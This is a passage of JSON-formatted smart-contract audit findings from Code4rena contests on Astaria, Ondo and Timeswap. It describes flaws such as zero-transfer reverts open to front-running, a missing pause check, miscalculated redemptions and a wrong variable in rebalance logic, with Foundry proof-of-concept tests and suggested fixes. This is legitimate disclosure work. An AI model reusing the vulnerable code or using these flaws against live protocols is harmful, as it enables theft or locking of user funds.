withdrawProxy  ```solidity uint256 withdrawBalance = ERC20(asset()).balanceOf(address(this)); ```  and  ```solidity ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance); ```  However, according to   https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers  Some tokens (e.g. LEND) revert when transfering a zero value amount.  If ERC20(asset()).balanceOf(address(this)) return 0, the transfer revert.  The impact is that transferWithdrawReserve is also used in the other place:  ```solidity   function commitToLien(     IAstariaRouter.Commitment calldata params,     address receiver   )     external     whenNotPaused     returns (uint256 lienId, ILienToken.Stack[] memory stack, uint256 payout)   {     _beforeCommitToLien(params);     uint256 slopeAddition;     (lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(       params,       receiver     );     _afterCommitToLien(       stack[stack.length - 1].point.end,       lienId,       slopeAddition     );   } ```  which calls:  ```solidity _beforeCommitToLien(params); ```  which calls:  ```solidity   function _beforeCommitToLien(IAstariaRouter.Commitment calldata params)     internal     virtual     override(VaultImplementation)   {     VaultData storage s = _loadStorageSlot();      if (s.withdrawReserve > uint256(0)) {       transferWithdrawReserve();     }     if (timeToEpochEnd() == uint256(0)) {       processEpoch();     }   } ```  which calls transferWithdrawReserve() which revet in 0 amount transfer.  Consider the case below:  1.  User A calls commitToLien transaction is pending in mempool. 2.  User B front-run User A's transaction by calling  transferWithdrawReserve() and the PublicVault has no ERC20 token balance or User B just want to call  transferWithdrawReserve and not try to front-run user A, but the impact and result is the same. 3.  User B's transaction executes first, 4.  User A first his transaction revert because the ERC20 token asset revert in 0 amount transfer in transferWithdrawReserve() call  ```solidity uint256 withdrawBalance = ERC20(asset()).balanceOf(address(this));  // prevent transfer of more assets then are available if (s.withdrawReserve <= withdrawBalance) { withdrawBalance = s.withdrawReserve; s.withdrawReserve = 0; } else { unchecked {   s.withdrawReserve -= withdrawBalance.safeCastTo88(); } }  ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance); ```  This revertion not only impact commitToLien, but also impact PublicVault.sol#updateVaultAfterLiquidation  ```solidity function updateVaultAfterLiquidation( uint256 maxAuctionWindow, AfterLiquidationParams calldata params ) public onlyLienToken returns (address withdrawProxyIfNearBoundary) { VaultData storage s = _loadStorageSlot();  _accrue(s); unchecked {   _setSlope(s, s.slope - params.lienSlope.safeCastTo48()); }  if (s.currentEpoch != 0) {   transferWithdrawReserve(); } uint64 lienEpoch = getLienEpoch(params.lienEnd); _decreaseEpochLienCount(s, lienEpoch);  uint256 timeToEnd = timeToEpochEnd(lienEpoch); if (timeToEnd < maxAuctionWindow) {   _deployWithdrawProxyIfNotDeployed(s, lienEpoch);   withdrawProxyIfNearBoundary = s.epochData[lienEpoch].withdrawProxy;    WithdrawProxy(withdrawProxyIfNearBoundary).handleNewLiquidation(  params.newAmount,  maxAuctionWindow   ); } ```  transaction can revert in above code when calling  ```solidity if (s.currentEpoch != 0) {   transferWithdrawReserve(); } uint64 lienEpoch = getLienEpoch(params.lienEnd); ```  if the address has no ERC20 token balance and the ERC20 token revert in 0 amount transfer after PublicVault#transferWithdrawReserve is called first  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the protocol just return and do nothing when  PublicVault#transferWithdrawReserve is called if the address has no ERC20 token balance."}, {"title": "Pause checks are missing on deposit for Private Vault", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/25", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-34"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L65   # Vulnerability details  ## Impact It is possible to make a deposit even when `_loadVISlot().isShutdown` is true. This check is done in `whenNotPaused` modifier and is already done for Public Vault but is missing for Private Vault, allowing unexpected deposits  ## Proof of Concept 1. Observe the deposit function at https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L59  ``` function deposit(uint256 amount, address receiver)     public     virtual     returns (uint256)   {     VIData storage s = _loadVISlot();     require(s.allowList[msg.sender] && receiver == owner());     ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);     return amount;   } ```  2. Observe there is no `whenNotPaused` modifier in deposit which confirm that shutdown has not been called yet  ``` modifier whenNotPaused() {     if (ROUTER().paused()) {       revert InvalidRequest(InvalidRequestReason.PAUSED);     }      if (_loadVISlot().isShutdown) {       revert InvalidRequest(InvalidRequestReason.SHUTDOWN);     }     _;   } ```  ## Recommended Mitigation Steps Revise the deposit function as below:  ``` function deposit(uint256 amount, address receiver)     public     virtual      whenNotPaused     returns (uint256)   {     VIData storage s = _loadVISlot();     require(s.allowList[msg.sender] && receiver == owner());     ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);     return amount;   } ```"}, {"title": "Loss of user funds when completing CASH redemptions", "html_url": "https://github.com/code-423n4/2023-01-ondo-findings/issues/325", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "primary issue", "H-01"], "target": "2023-01-ondo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-ondo/blob/main/contracts/cash/CashManager.sol#L707-L727   # Vulnerability details  The function `completeRedemptions` present in the `CashManager` contract is used by the manager to complete redemptions requested by users and also to process refunds.   https://github.com/code-423n4/2023-01-ondo/blob/main/contracts/cash/CashManager.sol#L707-L727  ```solidity function completeRedemptions(   address[] calldata redeemers,   address[] calldata refundees,   uint256 collateralAmountToDist,   uint256 epochToService,   uint256 fees ) external override updateEpoch onlyRole(MANAGER_ADMIN) {   _checkAddressesKYC(redeemers);   _checkAddressesKYC(refundees);   if (epochToService >= currentEpoch) {     revert MustServicePastEpoch();   }   // Calculate the total quantity of shares tokens burned w/n an epoch   uint256 refundedAmt = _processRefund(refundees, epochToService);   uint256 quantityBurned = redemptionInfoPerEpoch[epochToService]     .totalBurned - refundedAmt;   uint256 amountToDist = collateralAmountToDist - fees;   _processRedemption(redeemers, amountToDist, quantityBurned, epochToService);   collateral.safeTransferFrom(assetSender, feeRecipient, fees);   emit RedemptionFeesCollected(feeRecipient, fees, epochToService); } ```  The total refunded amount that is returned from the internal call to `_processRefund` is then used to calculate the effective amount of CASH burned (`redemptionInfoPerEpoch[epochToService].totalBurned - refundedAmt`). This resulting value is then used to calculate how much each user should receive based on how much CASH they redeemed and the total amount that was burned.   The main issue here is that the refunded amount is not updated in the `totalBurned` storage variable for the given epoch. Any subsequent call to this function won't take into account refunds from previous calls.  ## Impact  If the manager completes the refunds and redemptions at different steps or stages for a given epoch, using multiple calls to the `completeRedemptions`, then any refunded amount won't be considered in subsequent calls to the function.  Any redemption that is serviced in a call after a refund will be calculated using the total burned without subtracting the previous refunds. The function `completeRedemptions` will call the internal function `_processRedemption` passing the burned amount as the `quantityBurned` argument, the value is calculated in line 755:  https://github.com/code-423n4/2023-01-ondo/blob/main/contracts/cash/CashManager.sol#L755  ```solidity uint256 collateralAmountDue = (amountToDist * cashAmountReturned) /         quantityBurned; ```  This means that redemptions that are processed after one or more previous refunds will receive less collateral tokens even if they redeemed the same amount of CASH tokens (i.e. greater `quantityBurned`, less `collateralAmountDue`), causing loss of funds for the users.  ## PoC  In the following test, Alice, Bob and Charlie request a redemption. The admin first calls `completeRedemptions` to process Alice's request and refund Charlie. The admin then makes a second call to `completeRedemptions` to process Bob's request. Even though they redeemed the same amount of CASH (each `200e18`), Alice gets `150e6` tokens while Bob is sent `~133e6`.  ```solidity contract TestAudit is BasicDeployment {     function setUp() public {         createDeploymentCash();          // Grant Setter         vm.startPrank(managerAdmin);         cashManager.grantRole(cashManager.SETTER_ADMIN(), address(this));         cashManager.grantRole(cashManager.SETTER_ADMIN(), managerAdmin);         vm.stopPrank();          // Seed address with 1000000 USDC         vm.prank(USDC_WHALE);         USDC.transfer(address(this), INIT_BALANCE_USDC);     }      function test_CashManager_completeRedemptions_BadReedem() public {         _setupKYCStatus();          // Seed alice and bob with 200 cash tokens         _seed(200e18, 200e18, 50e18);          // Have alice request to withdraw 200 cash tokens         vm.startPrank(alice);         tokenProxied.approve(address(cashManager), 200e18);         cashManager.requestRedemption(200e18);         vm.stopPrank();          // Have bob request to withdraw 200 cash tokens         vm.startPrank(bob);         tokenProxied.approve(address(cashManager), 200e18);         cashManager.requestRedemption(200e18);         vm.stopPrank();          // Have charlie request to withdraw his tokens         vm.startPrank(charlie);         tokenProxied.approve(address(cashManager), 50e18);         cashManager.requestRedemption(50e18);         vm.stopPrank();          // Move forward to the next epoch         vm.warp(block.timestamp + 1 days);         vm.prank(managerAdmin);         cashManager.setMintExchangeRate(2e6, 0);          // Approve the cashMinter contract from the assetSender account         _seedSenderWithCollateral(300e6);          // First call, withdraw Alice and refund Charlie         address[] memory withdrawFirstCall = new address[](1);         withdrawFirstCall[0] = alice;         address[] memory refundFirstCall = new address[](1);         refundFirstCall[0] = charlie;          vm.prank(managerAdmin);         cashManager.completeRedemptions(             withdrawFirstCall, // Addresses to issue collateral to             refundFirstCall, // Addresses to refund cash             300e6, // Total amount of money to dist incl fees             0, // Epoch we wish to process             0 // Fee amount to be transferred to ondo         );          // Alice redemption is calculated taking the refund into account         uint256 aliceExpectedBalance = 200e18 * 300e6 / ((200e18 + 200e18 + 50e18) - 50e18);         assertEq(USDC.balanceOf(alice), aliceExpectedBalance);         assertEq(USDC.balanceOf(bob), 0);         assertEq(tokenProxied.balanceOf(charlie), 50e18);          // Second call, withdraw Bob         address[] memory withdrawSecondCall = new address[](1);         withdrawSecondCall[0] = bob;         address[] memory refundSecondCall = new address[](0);          vm.prank(managerAdmin);         cashManager.completeRedemptions(             withdrawSecondCall, // Addresses to issue collateral to             refundSecondCall, // Addresses to refund cash             300e6, // Total amount of money to dist incl fees             0, // Epoch we wish to process             0 // Fee amount to be transferred to ondo         );          // But here, Bob's redemption doesn't consider the previous refund.         uint256 bobBadBalance = uint256(200e18 * 300e6) / (200e18 + 200e18 + 50e18);         assertEq(USDC.balanceOf(bob), bobBadBalance);     }      function _setupKYCStatus() internal {         // Add KYC addresses         address[] memory addressesToKYC = new address[](5);         addressesToKYC[0] = guardian;         addressesToKYC[1] = address(cashManager);         addressesToKYC[2] = alice;         addressesToKYC[3] = bob;         addressesToKYC[4] = charlie;         registry.addKYCAddresses(kycRequirementGroup, addressesToKYC);     }      function _seed(         uint256 aliceAmt,         uint256 bobAmt,         uint256 charlieAmt     ) internal {         vm.startPrank(guardian);         tokenProxied.mint(alice, aliceAmt);         tokenProxied.mint(bob, bobAmt);         tokenProxied.mint(charlie, charlieAmt);         vm.stopPrank();     }      function _seedSenderWithCollateral(uint256 usdcAmount) internal {         vm.prank(USDC_WHALE);         USDC.transfer(assetSender, usdcAmount);         vm.prank(assetSender);         USDC.approve(address(cashManager), usdcAmount);     } } ```  ## Recommendation  Update the `totalBurned` amount to consider refunds resulting from the call to `_processRefund`:  ```solidity   function completeRedemptions(     address[] calldata redeemers,     address[] calldata refundees,     uint256 collateralAmountToDist,     uint256 epochToService,     uint256 fees   ) external override updateEpoch onlyRole(MANAGER_ADMIN) {     _checkAddressesKYC(redeemers);     _checkAddressesKYC(refundees);     if (epochToService >= currentEpoch) {       revert MustServicePastEpoch();     }     // Calculate the total quantity of shares tokens burned w/n an epoch     uint256 refundedAmt = _processRefund(refundees, epochToService);     uint256 quantityBurned = redemptionInfoPerEpoch[epochToService]       .totalBurned - refundedAmt; +   redemptionInfoPerEpoch[epochToService].totalBurned = quantityBurned;     uint256 amountToDist = collateralAmountToDist - fees;     _processRedemption(redeemers, amountToDist, quantityBurned, epochToService);     collateral.safeTransferFrom(assetSender, feeRecipient, fees);     emit RedemptionFeesCollected(feeRecipient, fees, epochToService);   } ``` "}, {"title": "Placeholder", "html_url": "https://github.com/code-423n4/2023-01-ondo-findings/issues/247", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "primary issue", "M-02"], "target": "2023-01-ondo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-ondo/blob/main/README.md?plain=1#L1   # Vulnerability details  c7a398a81e9d443542ca06717ef713924dafb717"}, {"title": "Rebalance logic is wrong and this distorts the pool's important states", "html_url": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/269", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-01-timeswap-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L679   # Vulnerability details  ## Impact The important states including `long0Balance, long1Balance, long1FeeGrowth, long1ProtocolFees` are wrongly calculated and it breaks the pool's invariant.  ## Proof of Concept The protocol provides a rebalancing functionality and the main logic is implemented in the library `Pool.sol`. If `param.isLong0ToLong1` is true and the transaction is `TimeswapV2PoolRebalance.GivenLong1`, the protocol calculates the `long1AmountAdjustFees` first and the actual `long0Amount, longFees` and the final `long1Balance` is decided accordingly. The problem is it is using the wrong parameter `pool.long0Balance` while it is supposed to use `pool.long1Balance` in the line L679.  This leads to wrong state calculation in the following logic. (especially L685 is setting the `long1Balance` to zero). Furthermore, the protocol is designed as a permission-less one and anyone can call `TimeswapV2Pool.rebalance()`. An attacker can abuse this to break the pool's invariant and take profit leveraging that.  ```solidity packages\\v2-pool\\src\\structs\\Pool.sol 665:     function rebalance(Pool storage pool, TimeswapV2PoolRebalanceParam memory param, uint256 transactionFee, uint256 protocolFee) external returns (uint256 long0Amount, uint256 long1Amount) { 666:         if (pool.liquidity == 0) Error.requireLiquidity(); 667: 668:         // No need to update short fee growth. 669: 670:         uint256 longFees; 671:         if (param.isLong0ToLong1) { 672:             if (param.transaction == TimeswapV2PoolRebalance.GivenLong0) { 673:                 (long1Amount, longFees) = ConstantSum.calculateGivenLongIn(param.strike, long0Amount = param.delta, transactionFee, true); 674: 675:                 if (long1Amount == 0) Error.zeroOutput(); 676: 677:                 pool.long1Balance -= (long1Amount + longFees); 678:             } else if (param.transaction == TimeswapV2PoolRebalance.GivenLong1) {     //************************************************************ 679:                 uint256 long1AmountAdjustFees = FeeCalculation.removeFees(pool.long0Balance, transactionFee);//@audit-info long0Balance -> long1Balance     //************************************************************ 680: 681:                 if ((long1Amount = param.delta) == long1AmountAdjustFees) { 682:                     long0Amount = ConstantSum.calculateGivenLongOutAlreadyAdjustFees(param.strike, pool.long1Balance, true); 683: 684:                     longFees = pool.long1Balance.unsafeSub(long1Amount); 685:                     pool.long1Balance = 0; 686:                 } else { 687:                     (long0Amount, longFees) = ConstantSum.calculateGivenLongOut(param.strike, long1Amount, transactionFee, true); 688: 689:                     pool.long1Balance -= (long1Amount + longFees); 690:                 } 691: 692:                 if (long0Amount == 0) Error.zeroOutput(); 693:             } 694: 695:             pool.long0Balance += long0Amount; 696: 697:             (pool.long1FeeGrowth, pool.long1ProtocolFees) = FeeCalculation.update(pool.liquidity, pool.long1FeeGrowth, pool.long1ProtocolFees, longFees, protocolFee); 698:         } else { 699:             if (param.transaction == TimeswapV2PoolRebalance.GivenLong0) { 700:                 uint256 long0AmountAdjustFees = FeeCalculation.removeFees(pool.long0Balance, transactionFee);//@audit-info 701: 702:                 if ((long0Amount = param.delta) == long0AmountAdjustFees) { 703:                     long1Amount = ConstantSum.calculateGivenLongOutAlreadyAdjustFees(param.strike, pool.long0Balance, false); 704: 705:                     longFees = pool.long0Balance.unsafeSub(long0Amount); 706:                     pool.long0Balance = 0; 707:                 } else { 708:                     (long1Amount, longFees) = ConstantSum.calculateGivenLongOut(param.strike, long0Amount, transactionFee, false); 709: 710:                     pool.long0Balance -= (long0Amount + longFees); 711:                 } 712: 713:                 if (long1Amount == 0) Error.zeroOutput(); 714:             } else if (param.transaction == TimeswapV2PoolRebalance.GivenLong1) { 715:                 (long0Amount, longFees) = ConstantSum.calculateGivenLongIn(param.strike, long1Amount = param.delta, transactionFee, false); 716: 717:                 if (long0Amount == 0) Error.zeroOutput(); 718: 719:                 pool.long0Balance -= (long0Amount + longFees); 720:             } 721: 722:             pool.long1Balance += long1Amount; 723: 724:             (pool.long0FeeGrowth, pool.long0ProtocolFees) = FeeCalculation.update(pool.liquidity, pool.long0FeeGrowth, pool.long0ProtocolFees, longFees, protocolFee); 725:         } 726:     } ``` ## Tools Used Manual Review  ## Recommended Mitigation Steps Fix the L679 as below. ```solidity uint256 long1AmountAdjustFees = FeeCalculation.removeFees(pool.long1Balance, transactionFee); ```"}, {"title": "sqrtDiscriminant can be calculated wrong", "html_url": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/227", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-01-timeswap-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-library/src/Math.sol#L69-L79   # Vulnerability details  ## Impact Due to the wrong calculation of short and long tokens during the `leverage` and `deleverage` process, the users can suffer financial loss while the protocol will lose fees  ## Proof of Concept The protocol uses `leverage` function to deposit short tokens and receive long tokens. On the opposite, `deleverage` function serves for depositing long tokens and receiving short tokens.  [Leverage Function of TimeswapV2Pool contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L430-L466) [Deleverage Function of TimeswapV2Pool contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L377-L418)  Both functions call the PoolLibrary's `leverage` and `deleverage` functions after input sanitization.  [Leverage Function of PoolLibrary contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L552-L655) [Deleverage Function of PoolLibrary contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L469-L539)   PoolLibrary's `leverage` and `deleverage` functions update the state of the pool first for the fee growth and compute the `long0Amount`, `long1Amount`, and `shortAmount`. It also checks the transaction type according to the passed parameter types as per the `Transaction` contract's enum types below and calls `ConstantProduct`'s appropriate function accordingly;  ```solidity /// @dev The different kind of deleverage transactions. enum TimeswapV2PoolDeleverage {     GivenDeltaSqrtInterestRate,     GivenLong,     GivenShort,     GivenSum }  /// @dev The different kind of leverage transactions. enum TimeswapV2PoolLeverage {     GivenDeltaSqrtInterestRate,     GivenLong,     GivenShort,     GivenSum } ```  If the transaction type is  `GivenSum`, both `leverage` and `deleverage` functions of PoolLibrary call `ConstantProduct.updateGivenSumLong` for the sum amount of the long position in the base denomination to be withdrawn, and the short position to be deposited.   ```solidity  } else if (param.transaction == TimeswapV2PoolDeleverage.GivenSum) {  (pool.sqrtInterestRate, longAmount, shortAmount, shortFees) = ConstantProduct.updateGivenSumLong( ... ``` [Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L516-L517)  ```solidity } else if (param.transaction == TimeswapV2PoolLeverage.GivenSum) {  (pool.sqrtInterestRate, longAmount, shortAmount, ) = ConstantProduct.updateGivenSumLong( ``` [Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L602-L603)     `updateGivenSumLong` updates the new square root interest rate given the sum of long positions in base denomination change and short position change;     ```solidity     function updateGivenSumLong(         uint160 liquidity,         uint160 rate,         uint256 sumAmount,         uint96 duration,         uint256 transactionFee,         bool isAdd     ) internal pure returns (uint160 newRate, uint256 longAmount, uint256 shortAmount, uint256 fees) {         uint256 amount = getShortOrLongFromGivenSum(liquidity, rate, sumAmount, duration, transactionFee, isAdd);          if (isAdd) (newRate, ) = getNewSqrtInterestRateGivenShort(liquidity, rate, amount, duration, false);         else newRate = getNewSqrtInterestRateGivenLong(liquidity, rate, amount, false);          fees = FeeCalculation.getFeesRemoval(amount, transactionFee);         amount -= fees;          if (isAdd) {             shortAmount = amount;             longAmount = sumAmount - shortAmount;         } else {             longAmount = amount;             shortAmount = sumAmount - longAmount;         }     } ``` [Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L230-L253)  And `updateGivenSumLong` calls `getShortOrLongFromGivenSum` in order to return the `amount` which represents the short amount or long amount calculated.  ```solidity     function getShortOrLongFromGivenSum(uint160 liquidity, uint160 rate, uint256 sumAmount, uint96 duration, uint256 transactionFee, bool isShort) private pure returns (uint256 amount) {         uint256 negativeB = calculateNegativeB(liquidity, rate, sumAmount, duration, transactionFee, isShort);         uint256 sqrtDiscriminant = calculateSqrtDiscriminant(liquidity, rate, sumAmount, duration, transactionFee, negativeB, isShort);         amount = (negativeB - sqrtDiscriminant).shr(1, false);     } ``` [Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L356-L362)  And the formula needs `sqrtDiscriminant` value to calculate the `amount` and it calls `calculateSqrtDiscriminant` [accordingly](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L395)  `calculateSqrtDiscriminant` function performs a bunch of checks and carries out mathematical functions to return the SqrtDiscriminant by utilizing FullMath and Math libraries.    ```solidity  sqrtDiscriminant = FullMath.sqrt512(b0, b1, true);  ```  [Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L430)  The `sqrt` formula in the Math contract uses the modified version of [Babylonian Method](https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method) when flags are included.  ```solidity     function sqrt(uint256 value, bool roundUp) internal pure returns (uint256 result) {          if (value == type(uint256).max) return result = type(uint128).max;         if (value == 0) return 0;         unchecked {             uint256 estimate = (value + 1) >> 1;             result = value;             while (estimate < result) {                 result = estimate;                 estimate = (value / estimate + estimate) >> 1;             }         }          if (roundUp && value % result != 0) result++;     } ``` [Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-library/src/Math.sol#L69-L79)  However, when the parameter `roundUp` is passed as `true`, this results in inconsistent behavior for different values. And it's being passed as true as can be seen [here](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L430)).  In order to show some examples let's pass the numbers as values and flag them true by using Math's `sqrt` function.   Values |1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30| --- | --- | --- | --- |--- |--- |--- |--- |--- |--- |--- |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|--- Results |1|1|1|2|3|**2**|3|**2**|3|4|4|**3**|4|4|**3**|4|5|5|5|**4**|5|5|5|**4**|5|6|6|6|6|**5**|     As can be seen from the table, the results are not distributed logically. And many times the result is steeply lesser than its neighbor results. (E.g Sqrt(6) ->2, Sqrt(15)->3 etc.)  The phenomenon occurs most if the values are small numbers.   So if the parameter  `value1` in `FullMath.sqrt512` is passed/calculated as zero value, it has a high chance of providing a wrong calculation as a result with the line below; ```solidity     function sqrt512(uint256 value0, uint256 value1, bool roundUp) internal pure returns (uint256 result) {         if (value1 == 0) result = value0.sqrt(roundUp); ``` This may lead wrong calculation of the `sqrtDiscriminant`, hence the wrong calculation of short or long amounts for the given transaction. The users might lose financial value due to this. Accordingly, the protocol might lose unspent fees as well.  While the fewer values are affected more on this one, the pools with fewer token decimals and fewer token amounts are more affected by this error. As an example, a [Gemini Dollar](https://coinmarketcap.com/currencies/gemini-dollar/) pool (59th rank on CMC and having 2 decimals) would be subject to false returns.  ## Tools Used Manual Review, Remix, Excel ## Recommended Mitigation Steps The team might consider not using `true` flag for `Math.sqrt` function."}, {"title": "Lock of all pool factory' pools protocol fees if pool factory get deployed with 0 address as chosenOwner", "html_url": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/212", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-16"], "target": "2023-01-timeswap-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L37 https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L184-L199 https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/base/OwnableTwoSteps.sol#L23-L32   # Vulnerability details  ## Impact If the pool factory gets deployed with `chosenOwner` as address(0) the factory owner will be address(0) and there will be no way of changing the owner address back to the intended owner. If this factory owner did not realize the mistake and deployed lots of pools through the factory, the protocol fees will be locked forever.  There will be no way for the intended factory owner to collect the protocol fees.  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L184-L199  ```     function collectProtocolFees(TimeswapV2PoolCollectParam calldata param) external override noDelegateCall returns (uint256 long0Amount, uint256 long1Amount, uint256 shortAmount) {         ParamLibrary.check(param);         raiseGuard(param.strike, param.maturity);          // Can only be called by the TimeswapV2Pool factory owner.         ITimeswapV2PoolFactory(poolFactory).owner().checkIfOwner();          // Calculate the main logic of protocol fee.         (long0Amount, long1Amount, shortAmount) = pools[param.strike][param.maturity].collectProtocolFees(param.long0Requested, param.long1Requested, param.shortRequested);          collect(param.strike, param.maturity, param.long0To, param.long1To, param.shortTo, long0Amount, long1Amount, shortAmount);          lowerGuard(param.strike, param.maturity);          emit CollectProtocolFees(param.strike, param.maturity, msg.sender, param.long0To, param.long1To, param.shortTo, long0Amount, long1Amount, shortAmount);     } ```  ## Proof of Concept  ``` //SPDX-License-Identifier: Unlicense pragma solidity 0.8.8;  import \"forge-std/Test.sol\";  //import \"@timeswap-labs/v2-pool/src/TimeswapV2Pool.sol\"; import \"@timeswap-labs/v2-option/src/TimeswapV2OptionFactory.sol\"; import \"@timeswap-labs/v2-pool/src/interfaces/ITimeswapV2Pool.sol\"; import \"@timeswap-labs/v2-option/src/interfaces/ITimeswapV2Option.sol\"; import \"@timeswap-labs/v2-pool/src/TimeswapV2PoolFactory.sol\";  import \"@helpers/HelperERC20.sol\";  contract ContractTest is Test {     TimeswapV2OptionFactory optionFactory;     TimeswapV2PoolFactory poolFactory;      ITimeswapV2Option opPair;     ITimeswapV2Pool pool;      HelperERC20 tokenA;     HelperERC20 tokenB;      // random values     uint256 chosenTransactionFee = 5;     uint256 chosenProtocolFee = 4;      address deployer = vm.addr(1);      address alice = vm.addr(2);      function setUp() public {}      function testOwner() public {         optionFactory = new TimeswapV2OptionFactory();         tokenA = new HelperERC20(\"Token A\", \"A\");         tokenB = new HelperERC20(\"Token B\", \"B\");         address opAddress = optionFactory.create(             address(tokenA),             address(tokenB)         );         opPair = ITimeswapV2Option(opAddress);         poolFactory = new TimeswapV2PoolFactory(             address(0),             chosenTransactionFee,             chosenProtocolFee         );         pool = ITimeswapV2Pool(poolFactory.create(opAddress));          console.log(\"pool factory owner\", poolFactory.owner());         console.log(\"pool factory pending owner\", poolFactory.pendingOwner());          console.log(\"Setting pending owner to alice\");         poolFactory.setPendingOwner(address(alice));                   console.log(\"pool factory owner\", poolFactory.owner());         console.log(\"pool factory pending owner\", poolFactory.pendingOwner());     } } ```  and the output: ```   pool factory owner 0x0000000000000000000000000000000000000000   pool factory pending owner 0x0000000000000000000000000000000000000000   Setting pending owner to alice  Test result: FAILED. 0 passed; 1 failed; finished in 9.22ms  Failing tests: Encountered 1 failing test in test/m01.t.sol:ContractTest [FAIL. Reason: NotTheOwner(0x34A1D3fff3958843C43aD80F30b94c510645C316, 0x0000000000000000000000000000000000000000)] testOwner() (gas: 15246385)  Encountered a total of 1 failing tests, 0 tests succeeded ```  ## Tools Used Manual review  ## Recommended Mitigation Steps In the constructor check for zero address or make the owner msg.sender, where the deployer could the call the setPendingOwner function to set the new owner. setPendingOwner checks for zero address.  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/base/OwnableTwoSteps.sol#L23-L32  ```     function setPendingOwner(address chosenPendingOwner) external override {         Ownership.checkIfOwner(owner);          if (chosenPendingOwner == address(0)) Error.zeroAddress();         chosenPendingOwner.checkIfAlreadyOwner(owner);          pendingOwner = chosenPendingOwner;          emit SetOwner(pendingOwner);     } ``` "}, {"title": "unexpected overflow for FullMath.add512() which can result in irregular behavior", "html_url": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-01-timeswap-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-library/src/FullMath.sol#L62   # Vulnerability details  ## Impact The vulnerability originate from insufficient checking in add512 function, where the AddOverflow revert gets bypassed, essentially the function assumes that an overflow only happen if (addendA1 > sum1), where in the case that it's possible for it overflow in the case that addendA1 == sum1, which can be resulted through assigning a value that makes ( lt(sum0, addendA0) == 1 ) <=> sum0 < addendA0, which can only be achieved normally by overflowing the 